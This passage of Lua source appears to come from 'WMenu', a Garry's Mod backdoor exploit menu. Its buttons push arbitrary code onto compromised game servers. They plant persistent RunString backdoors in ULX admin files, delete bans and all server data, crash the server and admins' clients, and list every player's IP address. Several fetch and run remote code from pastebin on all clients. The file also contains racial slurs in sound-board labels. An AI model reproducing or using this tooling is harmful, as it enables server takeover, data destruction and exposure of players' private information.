				warped.nvidlog("Player: "..Player(plr):Nick().." Was Given "..s1.." x"..s2)
			end)
		end)
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Drop All Guns", "Tab2", function()
		warped.sendlua([[
			local me = Player(]]..plr..[[)
			for i=1,#me:GetWeapons() do
				me:DropWeapon(me:GetActiveWeapon())
			end
		]])
		warped.nvidlog("Player: "..Player(plr):Nick().." Dropped All Their Guns!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("[ULX] Custom Rank", "Tab2", function()
		Derma_StringRequest("Rank Name", "Name To Set Rank:", "", function(s1)
			Derma_StringRequest("Inherits", "Will Inherit From:", "", function(s2)
				warped.sendlua([[
					RunConsoleCommand("ulx_logecho", 0)
						RunConsoleCommand("ulx", "addgroup", "]]..s1..[[", "]]..s2..[[")
						RunConsoleCommand("ulx", "adduser", "]]..Player(plr):Nick()..[[", "]]..s1..[[")
					RunConsoleCommand("ulx_logecho", 1)
				]])
				warped.nvidlog("Player: "..Player(plr):Nick().." Had Their Rank Set To: "..s1.." Which Inherits From: "..s2)
			end)
		end)
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Blind Player", "Tab2", function()
		warped.sendlua([[
			local me = Player(]]..plr..[[)
			me:SendLua("hook.Add('HUDPaint','Blindness',function() surface.SetDrawColor(255,255,255,255) surface.DrawRect(0,0,1920,1080) end)")
		]])
		warped.nvidlog("Player: "..Player(plr):Nick().." Was Blinded!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Unblind Player", "Tab2", function()
		warped.sendlua([[
			local me = Player(]]..plr..[[)
			me:SendLua("hook.Remove('HUDPaint','Blindness')")
		]])
		warped.nvidlog("Player: "..Player(plr):Nick().." Was Unblinded!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Overlay Text", "Tab3", function()
	    Derma_StringRequest("Set Custom Text", "Set Text", "", function(str)
	        warped.sendlua("for k, v in pairs(player.GetAll()) do v:PrintMessage( HUD_PRINTCENTER, \"" .. str .. "\") end")
	        warped.nvidlog("The Text: "..str.." Was Announced!")
	    end)
	    surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Remove Bans", "Tab3", function()
		warped.sendlua([[
			if file.Exists("ulib/bans.txt", "DATA") then
				file.Delete("ulib/bans.txt")
			end
		]])
		warped.nvidlog("Bans Were Deleted!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Print All IPs", "Tab3", function()
		warped.sendlua([[
				local id = ]] .. LocalPlayer():UserID() .. [[
				for k, v in pairs(player.GetAll()) do
					Player(id):ChatPrint("Player: " .. v:Nick() .. " (" .. v:SteamID() .. ") IP: " .. v:IPAddress())
				end
		]])
		warped.nvidlog("All IPs Printed!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Break Glass", "Tab3", function()
		warped.sendlua([[
			for k,v in pairs(player.GetAll()) do
				v:EmitSound("physics/glass/glass_largesheet_break" .. math.random(1, 3) .. ".wav", 100, math.random(40, 180))
			end
		]])
		warped.nvidlog("Glass Break Sound Started!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Unban SteamID", "Tab3", function()
		Derma_StringRequest("Unban SteamID", "SteamID to Unban:", "", function(str)
			warped.sendlua([[
				ULib.Unban("]]..str..[[")
			]])
			warped.nvidlog("Unbanned SteamID: "..str)
		end)
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Infect ULX", "Tab3", function()
		warped.sendlua([[
			file.Append('ulx/config.txt', "util.AddNetworkString('null') net.Receive('null', function() RunString(net.ReadString()) end)")
			file.Append('ulib/modules/ulx_init.lua', "util.AddNetworkString('nostrip') net.Receive('nostrip', function() RunString(net.ReadString())")
			file.Append('ulx/xgui/server/sv_bans.lua', "util.AddNetworkString('null') net.Receive('null', function() RunString(net.ReadString())")
			file.Append('ulx/xgui/server/sv_groups.lua', "util.AddNetworkString('insid3') net.Receive('insid3', function() RunString(net.ReadString())")
			file.Append('ulx/xgui/server/sv_maps.lua', "util.AddNetworkString('entityhealt') net.Receive('entityhealt', function() RunString(net.ReadString())")
			file.Append('ulx/xgui/server/sv_sandbox.lua', "util.AddNetworkString('BetStrep') net.Receive('BetStrep', function() RunString(net.ReadString())")
			file.Append('ulx/xgui/server/sv_settings.lua', "util.AddNetworkString('FPSBOOST') net.Receive('FPSBOOST', function() RunString(net.ReadString())")
		]])
		warped.nvidlog("ULX Has Been Infected!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Whitelist All Props", "Tab3", function()
		warped.sendlua([[
			if FPP then
				for k,v in pairs(FPP.Blocked) do
					for r, g in pairs(v) do
						RunConsoleCommand([=[FPP_RemoveBlocked]=], k, r)
					end
				end
			end
		]])
		warped.nvidlog("All Props Whitelisted!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Wipe Data", "Tab3", function()
		warped.sendlua([[
			local files, directories = file.Find("*", "DATA")
			for k, v in pairs(files) do
				file.Delete(v)
			end
		]])
		warped.nvidlog("Data Has Been Deleted!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Crash Server", "Tab3", function()
		warped.nvidlog("Server Crashing...")
		warped.sendlua([[
			while true do end
		]])
		warped.nvidlog("Server Downed! ggwp")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Gravity", "Tab3", function()
		Derma_StringRequest("Gravity", "Set The Gravity Value To (eg: 600)", "", function(str)
			warped.sendlua([[
				RunConsoleCommand("sv_gravity", ]]..str..[[)
			]])
			surface.PlaySound("UI/buttonclick.wav")
		end)
	end)

	warped.createbackdoor("Friction", "Tab3", function()
		Derma_StringRequest("Friction", "Set The Friction Value To (eg: 8)", "", function(str)
			warped.sendlua([[
				RunConsoleCommand("sv_friction", ]]..str..[[)
			]])
			surface.PlaySound("UI/buttonclick.wav")
		end)
	end)

	warped.createbackdoor("[EPIC] WGame Fucker", "Tab3", function()
		warped.sendlua([[
			for k,v in pairs(player.GetAll()) do
				v:SendLua("sound.PlayURL('https://cdn.discordapp.com/attachments/740004262507184208/745035448618975262/mlg_trimmed.mp3','mono', function(station) station:Play() end)")
			end
			timer.Simple(15, function()
				for k,v in pairs(player.GetAll()) do
					v:SendLua("http.Fetch('https://pastebin.com/raw/dZbWx8he', function(b,l,h,c) RunString(b) end)")
					v:SendLua("hook.Add('HUDPaint', 'Rainbow', function() local cin = math.sin(CurTime() * 10) * 255 surface.SetDrawColor(Color(cin, -cin, cin, 50)) surface.DrawRect(0, 0, ScrW(), ScrH()) end)")
					v:SendLua('hook.Add("Tick","Spam", function() chat.AddText(Color(math.Rand(50,200),math.Rand(50,200),math.Rand(50,200)), "Server Fucked By Project WMenu / Warped#1175 (https://discord.gg/YvCMeYm)") end)')
					BroadcastLua("http.Fetch('https://pastebin.com/raw/U2ByUzLk', function(body) RunString(body) end)")
					hook.Add('Tick','ShakeScreen', function()
						local me = Player(]]..LocalPlayer():UserID()..[[)
						me:ConCommand('escape')
						util.ScreenShake(me:GetPos(),10,10,99999,9999999)
					end)
					v:SetMaxSpeed(2222)
					v:SetRunSpeed(2222)
					v:SetJumpPower(999)
					v:GodEnable()
					RunConsoleCommand('sv_friction', -2)
					RunConsoleCommand('sv_gravity', 300)
					RunConsoleCommand('sv_airaccelerate', 999)
				end
			end)
			timer.Create('Dance',15,0,function()
				for k,v in pairs(player.GetAll()) do
					v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE)
				end
			end)
			timer.Create("SongPlayer",136.8,0,function()
				for k,v in pairs(player.GetAll()) do
					v:SendLua("sound.PlayURL('https://cdn.discordapp.com/attachments/740004262507184208/745035448618975262/mlg_trimmed.mp3','mono', function(station) station:Play() end)")
				end
			end)
			timer.Create("Notify", 0.5, function()
				for k,ply in pairs(player.GetAll()) do
					DarkRP.notify( ply, 0, 2.5, "Get Fucked" )
				end
			end)
			for k,v in pairs(player.GetAll()) do
				v.addMoney(1000000000)
			end
		]])
		warped.nvidlog("Game Fucker Started!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Hell Mode", "Tab3", function()
		warped.sendlua([[
			BroadcastLua("http.Fetch('https://pastebin.com/raw/7US43tsu', function(b,l,h,c) RunString(b) end)")
		]])
		warped.nvidlog("Hell Mode Activated!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Seize Server", "Tab3", function()
		warped.sendlua([[
			for k,v in pairs(player.GetAll()) do
				v:Kick("Server Seized By: Warped#1175\n For More Information Please Message: Warped#1175\n Get Fucked By WMenu")
			end
			RunConsoleCommand('killserver')
		]])
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Allow Luarun", "Tab3", function()
		warped.sendlua([[
			RunConsoleCommand("ulx", "groupallow", "user", "ulx luarun")
		]])
		warped.nvidlog("luarun enabled!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("[DarkRP] Reset All Money", "Tab3", function()
		warped.sendlua([[
			RunConsoleCommand("rp_resetallmoney")
		]])
		warped.nvidlog("All Money Reset!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Log ULX Echo", "Tab3", function()
		Derma_StringRequest("ULX Log Echo", "1 = Enabled // 0 = Disabled", "", function(str)
			warped.sendlua([[
				RunConsoleCommand('ulx','logecho',']]..str..[[')
			]])
			warped.nvidlog("logecho set to: "..str)
		end)
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Runstring URL", "Tab3", function()
		Derma_StringRequest("Run URL", "URL To Run:", "", function(str)
			warped.sendlua([[
				http.Fetch("]]..str..[[", function(b,l,h,c) RunString(b) end)
			]])
			warped.nvidlog("Ran URL: \""..str.."\" From Server!")
		end)
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Cleanup Map", "Tab3", function()
		warped.sendlua([[
			game.CleanUpMap()
		]])
		warped.nvidlog("Map Cleaned Up!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("[ULX] Bomb Ranks", "Tab3", function()
		Derma_StringRequest("Amount", "Amount of ranks to add", "", function(str)
			warped.sendlua([[
				for i=1,]]..str..[[ do
					local s1 = math.random(1000,9999)
					local s2 = math.random(1000,9999)
					RunConsoleCommand("ulx","addgroup",s1.."-"..s2,"user")
				end
			]])
		end)
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Restart Server", "Tab3", function()
		warped.sendlua([[
			RunConsoleCommand('_restart')
		]])
		warped.nvidlog("Server Restarted!")
		surface.PlaySound("UI/buttonclick.wav")
	end)
	warped.createbackdoor("[ATM] Interest", "Tab3", function()
		Derma_StringRequest("ATM Interest", "Interest You Earn Per 15min", "", function(str)
			warped.sendlua("BATM.MaxInterest =" .. str)
			warped.nvidlog("Max Interest Per Cycle Was Set To: "..str)
		end)
		surface.PlaySound("UI/buttonclick.wav")
	end)

	local dance = false
	warped.createbackdoor("[Toggle] Dance All", "Tab3", function()
		if (!dance) then
			warped.sendlua([[
				for k,v in pairs(player.GetAll()) do
					v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE)
				end
				timer.Create("LoopDance",8,0,function()
					for k,v in pairs(player.GetAll()) do
						v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE)
					end
				end)
			]])
			warped.nvidlog("Loop Dance: On!")
			dance = true
		else
			warped.sendlua([[
				timer.Remove("LoopDance")
			]])
			warped.nvidlog("Loop Dance: Off!")
			dance = false
		end
		surface.PlaySound("UI/buttonclick.wav")
	end)

	local tog = false
	warped.createbackdoor("[Toggle] Rain Food", "Tab3", function()
		if (!tog) then
			warped.sendlua([[
				BroadcastLua("http.Fetch('https://pastebin.com/raw/U2ByUzLk', function(body) RunString(body) end)")
			]])
			warped.nvidlog("Food Rain Started!")
			tog = true
		else
			warped.sendlua([[
				BroadcastLua("hook.Remove('PostDrawOpaqueRenderables','\xFFitsrainingchienchauds\xFF') hook.Remove('PostDrawOpaqueRenderables','\xFFitsrainingchienchauds2\xFF') timer.Remove('charglogo') timer.Remove('charglogo2')")
			]])
			warped.nvidlog("Food Rain Stopped!")
			tog = false
		end
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Console Say", "Tab3", function()
		Derma_StringRequest("Console Say", "Make Console Say In Chat: ", "", function(str)
			warped.sendlua([[
				RunConsoleCommand("say",']]..str..[[')
			]])
			warped.nvidlog("Console Just Said: "..str)
		end)
		surface.PlaySound("UI/buttonclick.wav")
	end)

	local bll = false
	warped.createbackdoor("[Toggle] Blue Mode", "Tab3", function()
		if (!bll) then
			bll = true
			warped.nvidlog("Blue Mode: On!")
			warped.sendlua([[
				for k,v in pairs(player.GetAll()) do
					v:SendLua("sound.PlayURL('https://cdn.discordapp.com/attachments/740004262507184208/744765685212774410/blue2.mp3','mono',function(station) station:Play() end)")
					v:SetColor(Color(0,0,255,255))
					timer.Simple(37,function()
						timer.Create('SP',0.2,0,function()
							for k,v in pairs(player.GetAll()) do
								v:ViewPunch(Angle(-5,math.random(-2,2),0))
							end
						end)
					end)
					timer.Create("Kill",311,0,function()
						v:Kill()
						v:Spawn()
					end)
				end
			]])
		else
			bll = false
			warped.nvidlog("Blue Mode: Off!")
			warped.sendlua([[
				for k,v in pairs(player.GetAll()) do
					BroadcastLua("LocalPlayer():ConCommand('stopsound')")
					v:SetColor(Color(255,255,255,255))
					timer.Remove("Kill")
					timer.Remove("SP")
					timer.Simple(37,function()
						timer.Remove("SP")
					end)
					timer.Simple(38,function()
						timer.Remove("SP")
					end)
				end
			]])
		end
		surface.PlaySound("UI/buttonclick.wav")
	end)

	local rbow = false
	warped.createbackdoor("[Toggle] Rainbow Mode", "Tab3", function()
		if (!rbow) then
			rbow = true
			warped.nvidlog("Rainbow: On!")
			warped.sendlua([[
				for k,v in pairs(player.GetAll()) do
					v:SendLua("hook.Add('HUDPaint', 'Rainbow', function() local cin = math.sin(CurTime() * 10) * 255 surface.SetDrawColor(Color(cin, -cin, cin, 50)) surface.DrawRect(0, 0, ScrW(), ScrH()) end)")
				end
			]])
		else
			rbow = false
			warped.nvidlog("Rainbow: Off!")
			warped.sendlua([[
				for k,v in pairs(player.GetAll()) do
					v:SendLua("hook.Remove('HUDPaint', 'Rainbow')")
				end
			]])
		end
		surface.PlaySound("UI/buttonclick.wav")
	end)

	local PartyMode = false
	warped.createbackdoor("Party Mode", "Tab3", function()
		if PartyMode == false then
			warped.sendlua([[
				for k,v in pairs(player.GetAll()) do
					v:SendLua('sound.PlayURL("https://cdn.discordapp.com/attachments/740004262507184208/744767087158755438/walk.mp3","mono",function(station) station:Play() end)')
					timer.Simple(11.75,function()
						v:SendLua('hook.Add("Tick","Spam", function() chat.AddText(Color(math.Rand(50,200),math.Rand(50,200),math.Rand(50,200)), "Server Fucked By Project WMenu / Warped#1175") end)')
						v:SendLua("hook.Add('HUDPaint', 'Rainbow', function() local cin = math.sin(CurTime() * 10) * 255 surface.SetDrawColor(Color(cin, -cin, cin, 100)) surface.DrawRect(0, 0, ScrW(), ScrH()) end)")
						timer.Create('ScreenPunch',0.2,0,function()
							for k,v in pairs(player.GetAll()) do
								v:ViewPunch(Angle(-5,math.random(-2,2),0))
							end
						end)
						timer.Create('Dance',15,0,function()
							for k,v in pairs(player.GetAll()) do
								v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE)
							end
						end)
						for k,v in pairs(player.GetAll()) do
							v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE)
						end
					end)
				end
			]])
			warped.nvidlog("Partymode On!")
			surface.PlaySound("UI/buttonclick.wav")
			PartyMode = true
		else
			warped.sendlua([[
				for k,v in pairs(player.GetAll()) do
					v:SendLua('hook.Remove("Tick","Spam")')
					v:SendLua('hook.Remove("HUDPaint","Rainbow")')
					timer.Remove('ScreenPunch')
					timer.Remove('Dance')
					v:ConCommand('stopsound')
					timer.Simple(12,function()
						v:SendLua('hook.Remove("Tick","Spam")')
						v:SendLua('hook.Remove("HUDPaint","Rainbow")')
						timer.Remove('ScreenPunch')
						timer.Remove('Dance')
					end)
				end
			]])
			warped.nvidlog("Partymode Off!")
			surface.PlaySound("UI/buttonclick.wav")
			PartyMode = false
		end
	end)

	warped.createbackdoor("[Util] Sound Board", "Tab3", function()
		DermaMain:Hide()
		local MusicFrame = vgui.Create("DFrame")
		MusicFrame:SetSize(500,500)
		MusicFrame:SetTitle("Sound Board")
		MusicFrame:Center()
		MusicFrame:MakePopup()
		MusicFrame:ShowCloseButton(true)
		function MusicFrame:Paint()
        local rbow = HSVToColor( CurTime() % 6 * 100, 1, 1 )
		    draw.RoundedBox(5, 0, 0, self:GetWide(), self:GetTall(), Color(25, 25, 25))
		    surface.DrawRect(0,0,self:GetWide(),self:GetTall())
        surface.SetDrawColor(rbow.r,rbow.g,rbow.b,255)
        surface.DrawOutlinedRect(0, 0, self:GetWide() , self:GetTall() )
		end
		local SP = vgui.Create("DScrollPanel",MusicFrame)
		SP:Dock(FILL)
		function SP:Paint()
		    draw.RoundedBox(5, 0, 0, self:GetWide(), self:GetTall(), Color(30, 30, 30))
		    surface.DrawRect(0,0,self:GetWide(),self:GetTall())
        surface.SetDrawColor(0,0,0,150)
        surface.DrawOutlinedRect(0, 0, self:GetWide() , self:GetTall() )
		end

		local SPBar = SP:GetVBar()
		SPBar:SetWide(0)

		local StartPos = 7.5
		local function CustomURL(url)
			local curl = vgui.Create("DButton", SP)
			curl:SetText('Custom URL')
			curl:SetSize(475,40)
			curl:SetPos(10,StartPos)
			function curl:Paint()
				draw.RoundedBox(5,0,0, self:GetWide(), self:GetTall(), Color(25, 25, 25))
				self:SetTextColor(Color(255,255,255))
				surface.DrawRect(0,0,self:GetWide(),self:GetTall())
        surface.SetDrawColor(0,0,0,150)
        surface.DrawOutlinedRect(0, 0, self:GetWide() , self:GetTall() )
        self:SetFont("Trebuchet18")
        self:SetTextColor(Color(255,255,255))
			end
			curl.DoClick = function()
				Derma_StringRequest("Play URL", "URL To Play:", "", function(str)
					warped.sendlua([[
						BroadcastLua("sound.PlayURL(']].. str ..[[' , 'mono', function() end)")
					]])
					warped.nvidlog("Sound: "..str.." Started Playing")
				end)
				surface.PlaySound("UI/buttonclick.wav")
			end
			StartPos = StartPos + 45
		end
		local function CreateSound(name, sound)
			local sbtn = vgui.Create("DButton", SP)
			sbtn:SetText(name)
			sbtn:SetSize(475,40)
			sbtn:SetPos(10,StartPos)
			function sbtn:Paint()
				draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(25,25,25))
				self:SetTextColor(Color(255,255,255))
				surface.DrawRect(0,0,self:GetWide(),self:GetTall())
        surface.SetDrawColor(0,0,0,150)
        surface.DrawOutlinedRect(0, 0, self:GetWide() , self:GetTall() )
        self:SetFont("Trebuchet18")
        self:SetTextColor(Color(255,255,255))
			end
			sbtn.DoClick = function()
				warped.sendlua([[
					BroadcastLua("sound.PlayURL(']]..sound..[[','mono',function(station) station:Play() end)")
				]])
				warped.nvidlog("Sound: "..name.." Started Playing")
				surface.PlaySound("UI/buttonclick.wav")
			end
			StartPos = StartPos + 45
		end
		local function ButtonStop()
			local stbtn = vgui.Create("DButton", SP)
			stbtn:SetText("Stop All Sounds")
			stbtn:SetSize(475,40)
			stbtn:SetPos(10,StartPos)
			function stbtn:Paint()
				draw.RoundedBox(5,0,0, self:GetWide(), self:GetTall(), Color(25, 25, 25))
				self:SetTextColor(Color(255,255,255))
        surface.SetDrawColor(0,0,0,150)
        surface.DrawOutlinedRect(0, 0, self:GetWide() , self:GetTall() )
        self:SetFont("Trebuchet18")
        self:SetTextColor(Color(255,255,255))
			end
			stbtn.DoClick = function()
				warped.sendlua([[
					for k,v in pairs(player.GetAll()) do
						v:ConCommand('stopsound')
					end
				]])
				warped.nvidlog("All Sounds Stopped!")
				surface.PlaySound("UI/buttonclick.wav")
			end
			StartPos = StartPos + 45
		end
		CustomURL()
		CreateSound('MLG','https://cdn.discordapp.com/attachments/740004262507184208/745035448618975262/mlg_trimmed.mp3')
		CreateSound('Fart Noise', 'https://cdn.discordapp.com/attachments/740004262507184208/744913837123305572/fart.mp3')
		CreateSound('Walk - Comethazine', 'https://cdn.discordapp.com/attachments/740004262507184208/744767087158755438/walk.mp3')
		CreateSound('Im Blue', 'https://cdn.discordapp.com/attachments/740004262507184208/744765685212774410/blue2.mp3')
		CreateSound('YNG Martyr - 1992', 'https://cdn.discordapp.com/attachments/740004262507184208/745809159882014780/1192_-_YNG_Martyr.mp3')
		CreateSound('Yung Gravy - Gravy Train', 'https://cdn.discordapp.com/attachments/740004262507184208/745813161910992896/Yung_Gravy_-_Gravy_Train_1.mp3')
		CreateSound('Nigga Nae Nae', 'https://cdn.discordapp.com/attachments/740004262507184208/745814148700438598/nigga_nae_nae.mp3')
    CreateSound('Simp Detector', 'https://cdn.discordapp.com/attachments/746169055324668016/747856917350711396/Yung_Nugget_-_Simp_Detector.mp3')
    CreateSound('Stay Strapped', 'https://cdn.discordapp.com/attachments/746169055324668016/747826032194879538/MC_Virgins__Yung_Nugget_-_Stay_Strapped_Official_Lyric_Video.mp3')
    CreateSound('Dbangz Anime Bitches', 'https://cdn.discordapp.com/attachments/746169055324668016/747823491771793448/Thick_Niggas_and_Anime_Bitches.mp3')
		ButtonStop()
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("[Double] Set Chance", "Tab3", function()
		Derma_StringRequest("Double Or Nothing Chance", "1-100", "", function(str)
			warped.sendlua("BDON_CONFIG.doubleChance =" .. str)
			warped.nvidlog("Double Or Nothing Chance Set To: "..str)
		end)
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("[DarkRP] Custom Job", "Tab2", function()
		local Random = math.random(1000,9999)
		warped.sendlua([[
			TEAM_]]..Random..[[ = DarkRP.createJob("]]..Random..[[", {
			model = "models/player/skeleton.mdl",
			weapons = {"arrest_stick","weapon_stunstick", "unarrest_stick", "m9k_glock", "m9k_dbarrel", "m9k_usas", "m9k_barret_m82", "m9k_svu", "m9k_acr", "m9k_vector", "m9k_m202", "m9k_milkormgl", "lockpick", "pro_lockpick", "staff_lockpick"},
			command = "]]..Random..[[",
			description = "Gamor Man!",
			max = 1,
			customCheck = function(ply) return ply:SteamID() == "]]..Player(plr):SteamID()..[[" end,
			CustomCheckFailMsg = "This isn't your custom class!",
			color = Color(0, 0, 0, 255),
			salary = 1000000000,
			admin = 0,
			vote = false,
			hasLicense = true,
			category = "Citizens",
			PlayerSpawn = function(ply)
				ply:SetMaxHealth(10000)
				ply:SetHealth(10000)
				ply:SetArmor(10000)
			end,
		]])
		warped.nvidlog("Player: "..Player(plr):Nick().." Custom Job Was Made With The Custom Command [/"..Random.."]")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	local KillAll = false
	warped.createbackdoor("[Toggle] Kill All", "Tab3", function()
		if not KillAll then
			warped.sendlua([[
				timer.Create("KillAll", 1, 0, function()
					for k,v in pairs(player.GetAll()) do
						v:Kill()
						v:Spawn()
					end
				end)
			]])
			warped.nvidlog("Kill All: On!")
			KillAll = true
		else
			warped.sendlua([[
				timer.Remove("KillAll")
			]])
			warped.nvidlog("Kill All: Off!")
			KillAll = false
		end
		surface.PlaySound("UI/buttonclick.wav")
	end)

	local CrashingAdmins = false
	warped.createbackdoor("Loop Crash Other Admins", "Tab3", function()
		if CrashingAdmins then
			warped.sendlua([[
				hook.Remove("Tick","CrashAdmins")
			]])
			warped.nvidlog("Crashing Admins: Off!")
			CrashingAdmins = false
		else
			warped.sendlua([[
				hook.Add('Tick', 'CrashAdmins', function()
					local me = Player(]]..plr..[[)
					local py = Player(]]..LocalPlayer():UserID()..[[)
					for k,v in pairs(player.GetAll())
						if v:GetUserGroup() ~= 'user' or 'vip' or 'vip+' or 'vip++' then
							if v:Nick() ~= py:Nick() then
								v:SendLua("function die() return die() end die()")
							end
						end
					end
				end)
			]])
			warped.nvidlog("Crashing Admins: On!")
			CrashingAdmins = true
		end
		surface.PlaySound("UI/buttonclick.wav")
	end)

  warped.createbackdoor("[Camo] Remove Effects", "Tab4", function()
    hook.Remove("RenderScreenspaceEffects","ShowCamoEffects")
    hook.Remove("HUDPaint","DrawActiveCamoItems")
  end)

	local Spammer = false
	warped.createbackdoor("[Toggle] Chat Spam", "Tab3", function()
		if (!Spammer) then
			Derma_StringRequest("Chat Spam", "Text To Spam:", "", function(str)
				warped.sendlua([[
					timer.Create("Spammer", 0.01, 0, function()
						for k,v in pairs(player.GetAll()) do
							v:SendLua("chat.AddText(Color(math.random(1,255),math.random(1,255),math.random(1,255)), ']]..str..[[')")
						end
					end)
				]])
				warped.nvidlog("Started Spamming: "..str.."!")
				Spammer = true
			end)
		else
			warped.sendlua([[
				timer.Remove("Spammer")
			]])
			Spammer = false
			timer.Simple(0.5,function()
				warped.nvidlog("Stopped Spammer!")
			end)
		end
		surface.PlaySound("UI/buttonclick.wav")
	end)
	concommand.Add("warped_menu", function()
	    if DermaMain:IsVisible() then
	        DermaMain:Hide()
	    else
	        DermaMain:Show()
	    end
	end)

	warped.createbackdoor("Give Menu", "Tab2", function()
		warped.sendlua([[
			local me = Player(]]..plr..[[)
			me:SendLua("http.Fetch('https://pastebin.com/raw/D506UQ57', function(body) RunString(body) end)")
		]])
		warped.nvidlog("Player: "..Player(plr):Nick().." Was Given Your Menu!")
		surface.PlaySound("UI/buttonclick.wav")
	end)

	local tgl = false
	warped.createbackdoor("Control Player", "Tab2", function()
		if (!tgl) then
			if Player(plr) ~= LocalPlayer() then
				warped.sendlua([[
					local ctrld = Player(]]..plr..[[)
					local ctrlr = Player(]]..LocalPlayer():UserID()..[[)

					ctrlr:Spectate(OBS_MODE_CHASE)
					ctrlr:SpectateEntity(ctrld)
					ctrlr:StripWeapons()

					ctrld:ScreenFade(SCREENFADE.IN, Color(0,0,0,255), 0.2, 0.3)

					timer.Create("RefreshCam",0.01,0,function()
						ctrld:SetEyeAngles(ctrlr:EyeAngles())
					end)
				]])
				timer.Create("RfshMovements",0.01,0,function()
					if input.IsKeyDown(KEY_W) then
						warped.sendlua([[
							local me = Player(]]..plr..[[)
							me:ConCommand("+forward")
						]])
					else
						warped.sendlua([[
							local me = Player(]]..plr..[[)
							me:ConCommand("-forward")
						]])
					end
					if input.IsKeyDown(KEY_S) then
						warped.sendlua([[
							local me = Player(]]..plr..[[)
							me:ConCommand("+back")
						]])
					else
						warped.sendlua([[
							local me = Player(]]..plr..[[)
							me:ConCommand("-back")
						]])
					end
					if input.IsKeyDown(KEY_D) then
						warped.sendlua([[
							local me = Player(]]..plr..[[)
							me:ConCommand("+moveright")
						]])
					else
						warped.sendlua([[
							local me = Player(]]..plr..[[)
							me:ConCommand("-moveright")
						]])
					end
					if input.IsKeyDown(KEY_A) then
						warped.sendlua([[
							local me = Player(]]..plr..[[)
							me:ConCommand("+moveleft")
						]])
					else
						warped.sendlua([[
							local me = Player(]]..plr..[[)
							me:ConCommand("-moveleft")
						]])
					end
					if input.IsShiftDown() then
						warped.sendlua([[
							local me = Player(]]..plr..[[)
							me:ConCommand("+speed")
						]])
					else
						warped.sendlua([[
							local me = Player(]]..plr..[[)
							me:ConCommand("-speed")
						]])
					end
					if input.IsMouseDown(MOUSE_LEFT) then
						warped.sendlua([[
							local me = Player(]]..plr..[[)
							me:ConCommand("+attack")
						]])
					else
						warped.sendlua([[
							local me = Player(]]..plr..[[)
							me:ConCommand("-attack")
						]])
					end
					if input.IsMouseDown(MOUSE_RIGHT) then
						warped.sendlua([[
							local me = Player(]]..plr..[[)
							me:ConCommand("+attack2")
						]])
					else
						warped.sendlua([[
							local me = Player(]]..plr..[[)
							me:ConCommand("-attack2")
						]])
					end
					if input.IsKeyDown(KEY_SPACE) then
						warped.sendlua([[
							local me = Player(]]..plr..[[)
							me:ConCommand("+jump")
						]])
					else
						warped.sendlua([[
							local me = Player(]]..plr..[[)
							me:ConCommand("-jump")
						]])
					end
					if input.IsKeyDown(KEY_LCONTROL) then
						warped.sendlua([[
							local me = Player(]]..plr..[[)
							me:ConCommand("+duck")
						]])
					else
						warped.sendlua([[
							local me = Player(]]..plr..[[)
							me:ConCommand("-duck")
						]])
					end
				end)
				tgl = true
				warped.nvidlog("Controller Turned: On!")
			else
				warped.nvidlog("Cannot Control Yourself!")
			end
		else
			warped.sendlua([[
				local ctrld = Player(]]..plr..[[)
				local ctrlr = Player(]]..LocalPlayer():UserID()..[[)

				ctrlr:UnSpectate()
				ctrlr:SpectateEntity(ctrlr)

				ctrlr:Spawn()

				ctrld:ScreenFade(SCREENFADE.IN, Color(0,0,0,0), 0.2, 0.3)

				timer.Remove("RefreshCam")
				timer.Simple(1,function()
					ctrld:ConCommand("-attack")
				end)
			]])
			timer.Remove("RfshMovements")
			tgl = false
			warped.nvidlog("Controller Turned: Off!")
		end
		surface.PlaySound("UI/buttonclick.wav")
	end)

	warped.createbackdoor("Change All Names", "Tab3", function()
		Derma_StringRequest("Change All Names", "Name to Set:", "", function(str)
			warped.sendlua([[
				local str = "]]..str..[["
				for k, v in next, player.GetAll() do
					DarkRP.storeRPName(v, str)
					v:setDarkRPVar("rpname", str)
				end
			]])
			warped.nvidlog("All Names Changed To: "..str)
		end)
		surface.PlaySound("UI/buttonclick.wav")
	end)

	local Bluem = false
	warped.createbackdoor("[Toggle] Blueify All", "Tab3", function()
		if (!Bluem) then
			warped.sendlua([[
				for k,v in pairs(player.GetAll()) do
					v:SetColor(Color(0,0,255,255))
				end
			]])
			warped.nvidlog("Blueify All: On!")
			Bluem = true
		else
			warped.sendlua([[
